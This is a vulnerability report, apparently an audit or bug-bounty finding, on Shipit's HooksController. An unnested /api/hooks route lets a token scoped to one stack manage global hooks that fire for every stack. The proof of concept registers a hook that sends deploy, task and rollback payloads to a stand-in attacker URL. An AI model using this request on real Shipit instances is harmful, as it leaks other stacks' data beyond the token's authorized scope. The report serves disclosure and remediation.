### Title
Stack-Scoped API Token Can Create/Manage Global Hooks Outside Its Authorized Stack - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
The API `HooksController` is mounted twice in `config/routes.rb`: once nested under a stack (`/api/stacks/*stack_id/hooks`) and once at the top level, unscoped (`/api/hooks`). Both routes are served by the same controller and the same `stack_id` helper, which derives the scope purely from `params[:stack_id].present?`. When accessed through the unnested route, `params[:stack_id]` is never present, so the controller resolves `stack_id` to `nil` and operates on **global** `Hook` records (`stack_id: nil`) that fire for every stack in the Shipit instance — completely bypassing the per-`ApiClient` stack restriction enforced everywhere else in `Api::BaseController`.

### Finding Description
`Api::BaseController#stacks` is the mechanism that confines a stack-scoped `ApiClient` to its own stack: [1](#0-0) 

Every other stack-nested controller resolves records via `stack`/`stacks`, so a token created with `stack_id` set (e.g. `here_come_the_walrus` fixture) can never touch another stack's `Task`, `Deploy`, `Commit`, etc. `HooksController`, however, computes its own ad-hoc scope: [2](#0-1) 

`stack_id` here only returns a value `if params[:stack_id].present?`. Because `config/routes.rb` mounts an un-nested `resources :hooks` at the API root in addition to the stack-nested one: [3](#0-2) 

hitting `/api/hooks` (the un-nested route) means `params[:stack_id]` is never set, so `stack_id` resolves to `nil`, and `hooks` becomes `Hook.where(stack_id: nil)` — i.e. the set of **global, unscoped hooks** that fire for all stacks (as seen in the `all_deploys` fixture, which has no `stack` and matches `deploy,rollback` events for every stack): [4](#0-3) 

This is only gated by the coarse `read:hook` / `write:hook` permission check, not by the stack-scoping mechanism: [5](#0-4) 

The binding that should hold is: **stack the token authorizes == stack the token's action touches**. Any `ApiClient` with `stack_id` set is supposed to be confined to that one stack, as enforced by `BaseController#stacks`/`#stack`. `HooksController`'s independent, route-shape-dependent scoping breaks this equality: a stack-scoped client with `write:hook`/`read:hook` permissions can create, read, update or destroy hooks with `stack_id: nil`, which Shipit's `Hook` model treats as unscoped/global and delivers for every stack's `deploy`, `rollback`, `task`, `lock`, `commit_status`, `merge`, `pull_request`, etc. events — not just the token's authorized stack.

### Impact Explanation
A token that is only supposed to be authorized for a single stack can:
- Create a global hook (`POST /api/hooks`, no `stack_id` param) with an attacker-controlled `delivery_url`, causing Shipit to send task/deploy/output/lock event payloads for **every stack in the instance** to that URL — an unauthenticated read of other stacks' task streams and deploy state, exceeding the token's authorized scope.
- Read (`GET /api/hooks`, `GET /api/hooks/:id`), update, or destroy existing global hooks that other, more privileged clients rely on, disrupting notification delivery for the whole deployment across all stacks.

This matches the High-impact bucket: "escalation into `Shipit.github_teams` authorization... unauthenticated read of stack state, task streams or deploy output" — here achieved via escalation beyond the stack an `ApiClient` token is scoped to.

### Likelihood Explanation
Requires possession of a valid `ApiClient` token that has been granted `read:hook`/`write:hook` permissions but is scoped to a single stack (`stack_id` set) — a normal, supported configuration for a low-privilege integration. No additional secrets, GitHub access, or special conditions are needed; only a plain HTTP request to the un-nested `/api/hooks` route instead of the nested `/api/stacks/:stack_id/hooks` route.

### Recommendation
`HooksController#stack_id` should not silently fall back to `nil`/global scope based on route shape. Either:
- Require `stack_id` unconditionally when the current `ApiClient` is stack-scoped (raise/`InsufficientPermission` if a stack-scoped client hits the un-nested `/api/hooks` route or omits `stack_id`), or
- Remove the un-nested `resources :hooks` route entirely and require all hook management to go through the stack-nested path, reserving un-scoped/global hook management for `ApiClient`s with no `stack_id` (i.e., truly unrestricted clients), consistent with how `BaseController#stacks` already governs every other resource.

### Proof of Concept
1. Create an `ApiClient` scoped to `stack_id: <stack A's id>` with permissions `['read:hook', 'write:hook']` (a normal low-privilege integration token, as modeled by the `here_come_the_walrus` fixture pattern).
2. Using that token, send `POST /api/hooks` (note: NOT `/api/stacks/:stack_id/hooks`) with `{"delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "task", "rollback"]}`.
3. `HooksController#stack_id` evaluates `params[:stack_id].present?` as `false` (since this route has no `stack_id` param), so the created `Hook` has `stack_id: nil`.
4. Any deploy/rollback/task event on **any stack** in the Shipit instance (not just the token's authorized stack A) now delivers its payload to `https://attacker.example.com/collect`, confirmed by `Hook.deliver`/`Hook#scoped?` treating `stack_id: nil` hooks as global, per `test/models/hook_test.rb` (`".scoped? returns true if the hook has a stack_id"`) and the `all_deploys` fixture semantics.
